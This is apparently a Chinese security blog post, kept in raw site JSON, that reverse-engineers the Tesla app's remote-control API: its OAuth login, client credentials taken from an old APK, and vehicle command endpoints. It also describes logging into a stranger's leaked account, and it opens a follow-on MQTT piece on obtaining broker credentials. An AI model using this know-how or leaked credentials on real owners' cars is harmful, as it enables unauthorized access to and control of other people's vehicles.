简介&lt;/h2&gt;\n&lt;p&gt;Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。&lt;/p&gt;\n&lt;p&gt;最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;熟悉Tesla业务流程，可以深入去挖掘漏洞；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;记录下所有关于车的数据，进行数据分析。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;!-- more --&gt;\n&lt;h2 id=\&#34;0x01-制定控制功能\&#34;&gt;0x01 制定控制功能&lt;/h2&gt;\n&lt;p&gt;在开始分析前，先来列一个功能清单，在后续分析过程中防止浪费时间。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;获取车辆列表；&lt;/li&gt;\n&lt;li&gt;获取车辆详细信息；&lt;/li&gt;\n&lt;li&gt;实现远程操作，包括温度控制、开启后备箱、开车锁；&lt;/li&gt;\n&lt;li&gt;通过召唤功能实现控制车前进后退；&lt;/li&gt;\n&lt;li&gt;批量控制汽车。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;0x02-app分析\&#34;&gt;0x02 APP分析&lt;/h2&gt;\n&lt;p&gt;在分析之前，通过查看、搜索Tesla官方内容未发现存在官方的API文档。最终决定通过其官方提供的APP来进行分析。尽管有人发布Tesla API的文档，根据文档或Github的公开库会更快。但是我们本着探寻原理的态度以来使自己得到提升。&lt;/p&gt;\n&lt;h3 id=\&#34;获取app\&#34;&gt;获取APP&lt;/h3&gt;\n&lt;p&gt;Tesla官方的Android app是需要在Google play上下载的，通过&lt;a href=\&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla\&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;地址下载即可。&lt;/p&gt;\n&lt;h3 id=\&#34;提取api地址\&#34;&gt;提取api地址&lt;/h3&gt;\n&lt;p&gt;这里个人习惯不同，我通常会先使用apkurlgrep来获取APK文件中的url地址。apkurlgrep为golang语言编写的提取APK文件中输入点的程序。Github地址:&lt;a href=\&#34;https://github.com/ndelphit/apkurlgrep\&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;。按照Github文档安装即可。&lt;/p&gt;\n&lt;p&gt;安装完成后，执行&lt;code&gt;apkurlgrep -a com.teslamotors.tesla.apk&lt;/code&gt; 等待显示结果即可。也可以将结果重定向到文件中。结果里有一些是多余的，找到一些我们关注的点即可。这里关注到有api的地址&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的地址，和带有api关键字的路径内容。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723039734.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723045778.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;接下来使用jadx反编译源码，将上述发现的关键字在源码中搜索，可以发现这些内容在两个json的文件中。具体内容如下：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723052304.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;根据定义的常量，在去进行搜索，可以看到其代码的位置。当然这里可以看出Tesla做了混淆，尽管可以分析，但是分析起来很耗精力。这个先暂停，先抓包分析来看看。&lt;/p&gt;\n&lt;h3 id=\&#34;抓包分析\&#34;&gt;抓包分析&lt;/h3&gt;\n&lt;p&gt;直接使用抓包工具即可。根据个人习惯选择，本文使用的是Burpsuite。在抓包的过程中会遇到有一些post data的内容是乱码格式，观察其请求头就可以得知使用了gzip压缩，解码可以通过burp的decode即可查看。对于重放，则可以直接去掉其请求头中&lt;code&gt;content-encoding:gzip&lt;/code&gt;和&lt;code&gt;Accept-Encoding: gzip, deflate&lt;/code&gt;即可。另外为了方便分析，可以设置scope过滤掉除tesla之外的记录显示。&lt;/p&gt;\n&lt;h3 id=\&#34;登录请求分析\&#34;&gt;登录请求分析&lt;/h3&gt;\n&lt;p&gt;开启拦截，我们使用打开手机中的Tesla APP。按照提示进行正常登录，截获到的请求我们可以先查看下，然后通过。操作完登录的整个流程，可以了解到这里涉及到4个域名，分别为auth-global.tesla.com、auth.tesla.cn、auth.tesla.com、owner-api.teslamotors.com。&lt;/p&gt;\n&lt;p&gt;其大致过程为先请求auth-global.tesla.com获取其地区，然后跳转到所属区域的服务，这里跳转到auth.tesla.cn，先显示的输入用户名，下一步后，跳转到auth.tesla.com域，显示用户名密码信息，输入用户名密码后也是经过auth.tesla.com。用户名密码正确，APP进行到程序主界面。 这里有两步，第一个先请求auth.tesla.com域获取jwt的token，第二将获取的jwt token带入请求owner-api.teslamotors.com。接下来的获取数据均请求到owner-api.teslamotors.com，由此也可以看出这个地址为api服务的地址，也就是最终我们只需要获取最后的那个token，就可以实现获取其他信息的操作。&lt;/p&gt;\n&lt;p&gt;大致流程图如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-flow\&#34;&gt;st=&amp;gt;start: 打开app\nop=&amp;gt;operation: auth-global.tesla.com判断区域跳\nop1=&amp;gt;operation: 跳转至auth.tesla.cn\nop2=&amp;gt;operation: 跳转至auth.tesla.com\nop3=&amp;gt;operation: APP主界面\nop4=&amp;gt;operation: 获取jwt token\nop5=&amp;gt;operation: 请求owner-api\ne=&amp;gt;end: 获取用户信息\nst(bottom)-&amp;gt;op(bottom)-&amp;gt;op1(bottom)-&amp;gt;op2(bottom)-&amp;gt;op3(bottom)-&amp;gt;op4(bottom)-&amp;gt;op5(bottom)-&amp;gt;cond\nop5-&amp;gt;e\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这里实现思路有如下几个：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;完全自己根据流程构造请求来获取。在实现过程中不仅有多个流程，还需要分析其请求中的参数，非常的麻烦。&lt;/li&gt;\n&lt;li&gt;可以采用headless的方式，一些过程由浏览器来完成，只需要填入参数，点击按钮等操作即可。当然这里需要调用浏览器。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;上面的方式都比较麻烦，有没有更简单的方法呢？仔细思考下，既然owner-api.teslamotors.com是提供api服务的，那么Tesla也会有其他的调用方式，如web等，那么其登录可能会更简单。这里我还去分析了下web登录。但是其登录后并未去请求owner-api.teslamotors.com。&lt;/p&gt;\n&lt;p&gt;而之前看网络上的api，只要发起一次请求就可以获取token，他们是如何获取的呢？&lt;/p&gt;\n&lt;p&gt;第一种尝试，通过Tesla官方的其他登录点来分析，收集了tesla几个域的子域名，通过寻找登录地来分析，最终没有收获。&lt;/p&gt;\n&lt;p&gt;第二种尝试，通过反编译的APK代码中搜索，通过查看可以确定tesla 采用了标准的oauth来实现，这里到发现对于owner-api.teslamotors.com的几种类型(grant_type)，分别有authorization_code、refresh_token、urn:ietf:params:oauth:grant-type:jwt-bearer。最后一种是app中登录用到的；refresh_token是用来刷新token的；authorization_code授权码模式(即先登录获取code,再获取token)。&lt;/p&gt;\n&lt;p&gt;查了下资料，oauth支持5类 grant_type 。除上述用到的外，还有password模式。而公开的api就是这种模式。那么既然支持这种模式，请求的参数字段和内容又怎么来的呢？新版本的APP里没有这种模式，陷入沉思中。片刻后，决定尝试下载老版本APP去分析下，通过搜索引擎找了3.8.5的老版本。反编译，搜索&lt;code&gt;grant_type&lt;/code&gt;，结果眼前一亮，老版本的只有password模式。而且参数也写的非常明显了。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723063315.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;至于这里的参数client_id和client_secret参数在上文中发现的json文件中有。email和password就是我们的用户名和密码。&lt;/p&gt;\n&lt;p&gt;至此，登录就分析完成了。我们可以直接构造一次请求，即可获取token了。后续在分析app的时候可以优先选择老版本入手。&lt;/p&gt;\n&lt;h3 id=\&#34;控制功能请求分析\&#34;&gt;控制功能请求分析&lt;/h3&gt;\n&lt;p&gt;登录后，要控制特斯拉汽车，先会获取账户所属的车辆。在APP中如果只有一辆车则直接现实车辆信息和控制界面，如果有两辆及以上，则会先选择要控制的车辆。&lt;/p&gt;\n&lt;p&gt;我们登录成功后，只要我们在当前APP界面中，在Burp中会收到多次请求。这里还可以看到关于发送log的请求，这在自己实现api时则可以跳过这个记录。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;&lt;strong&gt;车辆列表&lt;/strong&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;根据burp的历史记录，或者在拦截的时候拦截其相应内容来进行分析。通过分析可以看到获取vin，id号的请求是&lt;code&gt;/api/1/products&lt;/code&gt;，因为返回的格式为json，其信息都在因为返回内容在键，返回的内容中包含id号（id）、用户id（user_id）、vin、显示名字（display_name）、状态（state）等信息。这里id号后面会用到，对汽车进行的操作都是通过这里的id号。如果有两辆车以上，则遍历即可。&lt;/p&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;车辆详细信息&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;通过记录可以看到获取车辆详细信息的api地址为&lt;code&gt;/api/1/vehicles/{vehicle_id}/vehicle_data&lt;/code&gt; ，通过抓取停止状态和行驶状态下的数据，可以看到由&lt;code&gt;endpoints&lt;/code&gt;参数控制，值分别为&lt;code&gt;drive_state&lt;/code&gt;(行驶中)、&lt;code&gt;climate_state%3Bgui_settings&lt;/code&gt;、&lt;code&gt;climate_state%3Bcharge_state%3Bdrive_state%3Bgui_settings%3Bvehicle_state&lt;/code&gt;。&lt;/p&gt;\n&lt;p&gt;对于行驶中的状态，通过api可以获取当前驾驶速度。&lt;/p&gt;\n&lt;p&gt;这里根据返回的json进行分析即可。这里不做详细描述。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723074091.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ol start=\&#34;3\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;温度控制&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;采用同样的方式，在app中操作，在burp中进行拦截或者从sitemap，历史记录里去分析。&lt;/p&gt;\n&lt;p&gt;要先调整温度，需要先开启，然后设置温度。也可以关闭温度控制。&lt;/p&gt;\n&lt;p&gt;api地址为：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;/api/1/vehicles/{vehicle_id}/command/auto_conditioning_start //开启温度控制\n\n/api/1/vehicles/{vehicle_id}/command/auto_conditioning_stop  //关闭温度控制\n\n/api/1/vehicles/{vehicle_id}/command/set_temps\t\t\t\t\t//设置温度\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;开启和关闭使用空的json即可，或者去掉Content-Type头。&lt;/p&gt;\n&lt;p&gt;设置温度的请求如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;POST /api/1/vehicles/{vehicle_id}/command/set_temps HTTP/1.1\nuser-agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MOB31E; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36\nx-tesla-user-agent: TeslaApp/3.10.8-421/adff2e065/android/6.0.1\nauthorization: Bearer *****\nContent-Type: application/json; charset=utf-8\nContent-Length: 42\nHost: owner-api.teslamotors.com\nConnection: close\n\n{&amp;quot;driver_temp&amp;quot;:22.5,&amp;quot;passenger_temp&amp;quot;:22.5}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723087973.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在分析过程中还会出现响应头尾304的情况，一般出现在GET请求中，我们只需要去掉If-None-Match请求头即可。&lt;/p&gt;\n&lt;ol start=\&#34;4\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;对于其他功能，分析方法都大致类似，了解了方法后，可以去分析其他的部分，然后对比已经公布的api文档来确认。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h3 id=\&#34;召唤功能控车\&#34;&gt;召唤功能控车&lt;/h3&gt;\n&lt;p&gt;特斯拉在2016年推出了召唤功能，2019年推出了智能召唤功能。智能召唤功能支持车辆自主行驶避让障碍物，并能到达车主面前或者车主指定的位置，无需驾驶员在车内控制。当然这项功能对场地有一定要求，仅限于在“私家停车区域和行车道”使用，无法在公路上使用该功能。&lt;/p&gt;\n&lt;p&gt;召唤功能不是使用的&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;，而是websocket通信，通信服务器为&lt;code&gt;streaming.vn.teslamotors.com&lt;/code&gt;。由于特殊原因，此次召唤功能将在下篇内容中介绍。&lt;/p&gt;\n&lt;h3 id=\&#34;分析结果\&#34;&gt;分析结果&lt;/h3&gt;\n&lt;p&gt;根据截获的流量信息，总结一下Telsa api的几个技术点：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;Tesla的大多数功能调用的是&lt;code&gt;owner-api.teslamotors.com&lt;/code&gt;的api接口；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;使用了oAuth 2 标准；APP采用jwt方式来获取api接口的token信息，其jwt加密方式为RS256；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;发起的请求除登录、找回密码功能外需要&lt;code&gt;Authorization: Bearer&lt;/code&gt; 请求头，后面内容为token，token具有有效期；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;召唤功能使用的是websocket的方式，其服务器地址&lt;code&gt;wss://streaming.vn.teslamotors.com/&lt;/code&gt;。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;0x03-编程实现\&#34;&gt;0x03 编程实现&lt;/h2&gt;\n&lt;p&gt;这里开发语言选择Python3，其版本使用的是3.8。采用异步编程，这里会选择使用aiohttp库。编程实现将在下篇内容中来详细说明。&lt;/p&gt;\n&lt;p&gt;对于大多数人来说，没有车是分析的最大问题？&lt;/p&gt;\n&lt;p&gt;我也面临同样的问题，每天上下班路上看着从自己身边路过的特斯拉，彷佛它在无情的嘲笑着我，心中不免泛起淡淡的忧伤。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723104961.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;抱怨改变不了现实，于是借助搜索大法，几分钟后，成功获取到一个韩国人的账号，此刻我露出了久违的微笑。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723142577.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;9\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723149573.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;本着负责任的态度，我们第一时间向泄漏账号的人发送了邮件。截止到目前，我们仍未收到回复的邮件。我们会持续跟进该事情进展，并会及时更新至本文。注：本文分析是利用自己的账号进行，意外获取他人账号只是一个小惊喜。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;10\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1602723157261.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;0x04-总结\&#34;&gt;0x04 总结&lt;/h2&gt;\n&lt;p&gt;本文通过对Tesla app逆向、抓包的方式分析出其api接口。通过本文的研究可以发现，汽车越来越智能化、方便的同时，却也引入了新的安全风险。尽管运用了很多复杂的技术来提高和保证其安全性。但是一旦黑客获取到用户名密码，就可以把Tesla开走。而获取用户名和密码的手段还是可以通过传统的方式来获得。在下一篇的文章中将尝试通过python编程实现利用API来批量控制特斯拉。&lt;/p&gt;\n&lt;h2 id=\&#34;0x05-参考\&#34;&gt;0x05 参考&lt;/h2&gt;\n&lt;p&gt;&lt;a href=\&#34;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla\&#34;&gt;https://apps.evozi.com/apk-downloader/?id=com.teslamotors.tesla&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://github.com/ndelphit/apkurlgrep\&#34;&gt;https://github.com/ndelphit/apkurlgrep&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://tesla-api.timdorr.com/\&#34;&gt;https://tesla-api.timdorr.com/&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;hacking-all-the-cars-tesla-api-exploit-part-one&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。&lt;/p&gt;\n&lt;h2 id=\&#34;0x00-简介\&#34;&gt;0x00 简介&lt;/h2&gt;\n&lt;p&gt;Tesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现的意义是什么呢？为什么不用官方提供的app呢？而且Github也有大量开源项目。&lt;/p&gt;\n&lt;p&gt;最开始我也有同样的疑问，但是，当我去尝试了解后，发现分析api，自己可以拓展多种玩法：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;挖掘潜在的隐藏功能。在漏洞挖掘过程中，总会有一些未在界面显示，被开发者隐藏起来的一些功能。这些功能一旦被我们发现，对漏洞挖掘或者实现额外的功能都有帮助。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;实现批量控车功能。官方的APP同时只能控制一台汽车，无法控制多台。我们熟悉API后，我们则可以实现批量控制汽车，实现速度与激情中的控车场景，这想想都觉得很酷；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;熟悉Tesla业务流程，可以深入去挖掘漏洞；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;尽管目前网络上有很多Tesla的API代码或库，但是其他的车还没有。我们以Tesla为典型例子，可以将其思路和方法拓展到其他同类的汽车厂商中；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;个性化定制，通过API可以按照自己习惯定制流程，控制更加灵活。还可以拓展功能，如雨天自动关闭天窗，根据情况自动制热/冷却等。甚至可以做成一个商业产品；&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;通过api调用，配合代理跳板实现隐藏自身，同时不会暴漏自己的imei、设备等，减少APP信息收集导致的隐私泄漏。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;记录下所有关于车的数据，进行数据分析。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;title&#34;:&#34;Hacking All The Cars之Tesla API分析与利用（上）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;tesla&#34;,&#34;slug&#34;:&#34;VY1b8zpK8Si&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/VY1b8zpK8Si/&#34;},{&#34;name&#34;:&#34;api&#34;,&#34;slug&#34;:&#34;7eD1ZtZoOvK&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7eD1ZtZoOvK/&#34;},{&#34;name&#34;:&#34;automotive&#34;,&#34;slug&#34;:&#34;prvJjB7Fua5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/prvJjB7Fua5/&#34;},{&#34;name&#34;:&#34;cars&#34;,&#34;slug&#34;:&#34;qobuc1uUtQM&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/qobuc1uUtQM/&#34;},{&#34;name&#34;:&#34;oauth&#34;,&#34;slug&#34;:&#34;KWrMfPIO7dM&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/KWrMfPIO7dM/&#34;},{&#34;name&#34;:&#34;特斯拉&#34;,&#34;slug&#34;:&#34;CoQ1NF-VhSi&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CoQ1NF-VhSi/&#34;},{&#34;name&#34;:&#34;汽车安全&#34;,&#34;slug&#34;:&#34;UZcct0IlqHT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/UZcct0IlqHT/&#34;}],&#34;date&#34;:&#34;2020-10-15 08:49:18&#34;,&#34;dateFormat&#34;:&#34;2020-10-15&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/hacking-all-the-cars-tesla-api-exploit-part-one/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;14 min read&#34;,&#34;time&#34;:781000,&#34;words&#34;:3506,&#34;minutes&#34;:14},&#34;description&#34;:&#34;该系列文章将通过逆向的方式分析Tesla远程api，并自己编写代码实现远程控制Tesla汽车。\n0x00 简介\nTesla自身的app具备控车的一些功能，如解锁、温度控制、充电、行车轨迹、召唤功能等。那么可能有朋友要问了，分析app自己实现...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x00-%E7%AE%80%E4%BB%8B\&#34;&gt;0x00 简介&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x01-%E5%88%B6%E5%AE%9A%E6%8E%A7%E5%88%B6%E5%8A%9F%E8%83%BD\&#34;&gt;0x01 制定控制功能&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x02-app%E5%88%86%E6%9E%90\&#34;&gt;0x02 APP分析&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%8E%B7%E5%8F%96app\&#34;&gt;获取APP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8F%90%E5%8F%96api%E5%9C%B0%E5%9D%80\&#34;&gt;提取api地址&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90\&#34;&gt;抓包分析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%99%BB%E5%BD%95%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90\&#34;&gt;登录请求分析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8E%A7%E5%88%B6%E5%8A%9F%E8%83%BD%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90\&#34;&gt;控制功能请求分析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%AC%E5%94%A4%E5%8A%9F%E8%83%BD%E6%8E%A7%E8%BD%A6\&#34;&gt;召唤功能控车&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C\&#34;&gt;分析结果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x03-%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0\&#34;&gt;0x03 编程实现&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x04-%E6%80%BB%E7%BB%93\&#34;&gt;0x04 总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#0x05-%E5%8F%82%E8%80%83\&#34;&gt;0x05 参考&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;上一篇 &lt;a href=\&#34;https://bacde.me/post/mqtt-security-part-one/\&#34;&gt;物联网安全之MQTT协议安全 &lt;/a&gt;主要介绍了MQTT安全的一些基础知识。今天将在上一篇基础上来说说实战中MQTT的利用。&lt;/p&gt;\n&lt;p&gt;在整个物联网或车联网架构中，MQTT的部分通常应用在移动端、管理端、Web端、设备端。而MQTT协议中的三种角色是发布者（PUBLISHER）、订阅者（SUBCRIBER）、代理（BROKER）。发布者（PUBLISHER）和订阅者（SUBCRIBER）通过代理（BROKER）来发布和订阅消息。这两个角色在实际场景中主要应用是移动端、Web端、设备端；代理（BROKER）一般是服务器，可以由activemq、hivemq、emqx等许多软件来搭建。在开发过程中，不同的设备，技术特点也有所不同。其使用的协议除了mqtt外，Web端通常使用websocket的方式来进行收发消息。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1599967523996.png\&#34; alt=\&#34;mqtt应用场景\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;center&gt;EMQ X Broker 场景&lt;/center&gt;\n&lt;h2 id=\&#34;0x00-获取mqtt认证信息\&#34;&gt;0x00 获取MQTT认证信息&lt;/h2&gt;\n&lt;p&gt;目前对于MQTT的开发中的安全还尚未受到广泛关注，这使得有多种方式在移动端、Web端、设备端获取到MQTT的认证与连接信息。通过获取的信息来进一步实现越权访问、发布恶意内容等攻击。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;由于设备方面暂未找到案例，这里将以Web端和移动端案例来进行说明。&lt;/p&gt;\n&lt;h3 id=\&#34;开发的一点知识\&#34;&gt;&lt;strong&gt;开发的一点知识&lt;/strong&gt;&lt;/h3&gt;\n&lt;p&gt;通过查阅一些开发资料，可以发现常见的几个MQTT的javascript库：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-paho-js\&#34;&gt;Paho.js&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-js\&#34;&gt;MQTT.js&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://www.hivemq.com/blog/mqtt-client-library-encyclopedia-mqttelements\&#34;&gt;mqtt-elements&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;https://www.hivemq.com/blog/mqtt-client-library-mqtt-dart\&#34;&gt;MQTT.DART&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;在实际的研究过程中发现尤其以paho.js居多。在实际的渗透过程中需要多留意，使用本库基本可以确定Web端应用了MQTT的。以下我就介绍几个获取MQTT的几个小技巧。&lt;/p&gt;\n&lt;h3 id=\&#34;实战工具\&#34;&gt;&lt;strong&gt;实战工具&lt;/strong&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Chrome 浏览器&lt;/li&gt;\n&lt;li&gt;Burp Suite&lt;/li&gt;\n&lt;li&gt;source 